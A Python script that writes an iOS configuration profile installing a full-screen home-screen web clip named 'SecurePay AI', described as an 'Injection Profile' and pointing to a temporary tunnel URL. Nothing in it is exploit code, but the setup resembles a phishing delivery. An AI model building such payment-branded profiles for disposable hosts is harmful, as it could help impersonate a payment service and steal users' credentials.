import base64
import os

def generate_mobileconfig():
    icon_path = 'frontend/public/securepay_app_icon.png'
    output_path = 'frontend/public/securepay.mobileconfig'
    
    with open(icon_path, 'rb') as f:
        icon_data = base64.b64encode(f.read()).decode()

    config = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>FullScreen</key>
            <true/>
            <key>Icon</key>
            <data>{icon_data}</data>
            <key>IsRemovable</key>
            <true/>
            <key>Label</key>
            <string>SecurePay AI</string>
            <key>PayloadDescription</key>
            <string>SecurePay AI Injection Profile</string>
            <key>PayloadDisplayName</key>
            <string>SecurePay AI</string>
            <key>PayloadIdentifier</key>
            <string>com.securepay.ai.webclip</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>76D36DE0-0B5D-4F7C-99B7-1A2B3C4D5E6F</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Precomposed</key>
            <true/>
            <key>URL</key>
            <string>https://rude-lines-thank.loca.lt</string>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>SecurePay AI Injection</string>
    <key>PayloadIdentifier</key>
    <string>com.securepay.ai.profile</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>A1B2C3D4-E5F6-4A5B-9C8D-0E1F2A3B4C5D</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>
'''
    with open(output_path, 'w') as f:
        f.write(config)
    print(f"Profile generated at: {output_path}")

if __name__ == "__main__":
    generate_mobileconfig()
